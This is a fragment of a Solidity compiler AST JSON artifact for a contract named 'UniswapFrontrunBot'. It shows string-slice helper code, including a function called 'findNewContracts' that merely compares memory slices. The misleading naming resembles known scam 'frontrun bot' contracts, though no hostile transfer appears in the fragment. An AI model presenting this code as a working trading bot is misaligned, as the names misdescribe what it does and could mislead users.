																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 181,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2462:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 180,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2462:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 184,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2462:15:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2445:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 47,
												"id": 186,
												"nodeType": "Return",
												"src": "2438:39:0"
											}
										]
									},
									"documentation": null,
									"id": 188,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 188,
												"src": "1107:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 40,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "1107:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 43,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 188,
												"src": "1126:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 42,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "1126:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1106:39:0"
									},
									"returnParameters": {
										"id": 47,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 46,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 188,
												"src": "1169:3:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 45,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "1169:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1168:5:0"
									},
									"scope": 1680,
									"src": "1081:1404:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 309,
										"nodeType": "Block",
										"src": "2831:1309:0",
										"statements": [
											{
												"assignments": [
													202
												],
												"declarations": [
													{
														"constant": false,
														"id": 202,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 309,
														"src": "2842:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 201,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2842:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 204,
												"initialValue": {
													"argumentTypes": null,
													"id": 203,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 192,
													"src": "2853:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2842:18:0"
											},
											{
												"assignments": [
													206
												],
												"declarations": [
													{
														"constant": false,
														"id": 206,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 309,
														"src": "2871:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 205,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2871:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 207,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "2871:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 210,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 208,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 194,
														"src": "2897:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 209,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 190,
														"src": "2910:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2897:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 304,
												"nodeType": "IfStatement",
												"src": "2893:1205:0",
												"trueBody": {
													"id": 303,
													"nodeType": "Block",
													"src": "2919:1179:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 213,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 211,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 194,
																	"src": "2938:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 212,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2951:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2938:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 301,
																"nodeType": "Block",
																"src": "3608:479:0",
																"statements": [
																	{
																		"assignments": [
																			270
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 270,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 301,
																				"src": "3677:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 269,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3677:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 271,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3677:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3717:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3719:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3737:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3748:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3727:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3727:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3719:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 270,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3719:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 194,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3748:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 196,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3737:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 272,
																		"nodeType": "InlineAssembly",
																		"src": "3708:52:0"
																	},
																	{
																		"body": {
																			"id": 299,
																			"nodeType": "Block",
																			"src": "3830:242:0",
																			"statements": [
																				{
																					"assignments": [
																						286
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 286,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 299,
																							"src": "3853:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 285,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3853:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 287,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3853:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3901:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3903:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3925:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3930:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3915:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3915:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3903:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 194,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3930:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 202,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3925:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 286,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3903:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 288,
																					"nodeType": "InlineAssembly",
																					"src": "3892:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 291,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 289,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 270,
																							"src": "3968:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 290,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 286,
																							"src": "3976:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "3968:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 294,
																					"nodeType": "IfStatement",
																					"src": "3964:57:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 292,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 202,
																							"src": "4018:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 200,
																						"id": 293,
																						"nodeType": "Return",
																						"src": "4011:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 297,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 295,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 202,
																							"src": "4044:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 296,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "4051:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "4044:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 298,
																					"nodeType": "ExpressionStatement",
																					"src": "4044:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 281,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 277,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 206,
																				"src": "3795:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 280,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 278,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 190,
																					"src": "3802:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 279,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 194,
																					"src": "3812:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3802:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3795:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 300,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 275,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 273,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 206,
																					"src": "3786:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 274,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3792:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3786:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 276,
																			"nodeType": "ExpressionStatement",
																			"src": "3786:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 283,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3823:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 282,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 206,
																					"src": "3823:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 284,
																			"nodeType": "ExpressionStatement",
																			"src": "3823:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "3781:291:0"
																	}
																]
															},
															"id": 302,
															"nodeType": "IfStatement",
															"src": "2934:1153:0",
															"trueBody": {
																"id": 268,
																"nodeType": "Block",
																"src": "2955:647:0",
																"statements": [
																	{
																		"assignments": [
																			215
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 215,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 268,
																				"src": "2974:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 214,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2974:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 232,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 230,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "2997:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 228,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 226,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 218,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "2999:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 224,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 219,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "3005:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 222,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 220,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "3010:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 221,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 194,
																																"src": "3015:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "3010:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 223,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "3009:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "3005:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 225,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "3004:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "2999:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 227,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "3029:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "2999:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 229,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "2998:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 217,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2989:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 216,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2989:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 231,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2989:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2974:58:0"
																	},
																	{
																		"assignments": [
																			234
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 234,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 268,
																				"src": "3054:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 233,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3054:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 235,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3054:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3100:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3102:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "3126:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3120:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3120:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3138:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3116:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3116:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "3102:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 215,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3138:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 234,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3102:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 196,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3126:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 236,
																		"nodeType": "InlineAssembly",
																		"src": "3091:54:0"
																	},
																	{
																		"assignments": [
																			238
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 238,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 268,
																				"src": "3166:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 237,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "3166:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 244,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 243,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 241,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 239,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 192,
																					"src": "3177:7:0",
																					"typeDescriptions": {
